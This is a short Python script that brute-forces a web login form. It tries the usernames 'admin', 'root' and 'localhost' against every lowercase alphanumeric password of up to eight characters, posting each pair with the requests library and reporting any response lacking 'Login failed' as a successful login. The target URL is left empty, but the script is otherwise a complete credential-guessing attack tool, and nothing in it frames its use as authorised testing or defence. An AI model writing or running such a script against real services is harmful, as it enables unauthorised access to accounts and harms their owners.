import requests
import itertools

# List of usernames to try
usernames = ["admin", "root", "localhost"]

# Function to generate passwords
def generate_passwords():
    for length in range(1, 9):
        for combination in itertools.product("abcdefghijklmnopqrstuvwxyz0123456789", repeat=length):
            yield "".join(combination)

# Function to make login request
def try_login(username, password):
    response = requests.post("", data={"username": username, "password": password})
    if "Login failed" not in response.text:
        return True
    else:
        return False

# Brute-force loop
for username in usernames:
    for password in generate_passwords():
        if try_login(username, password):
            print(f"Login successful: {username}:{password}")
            break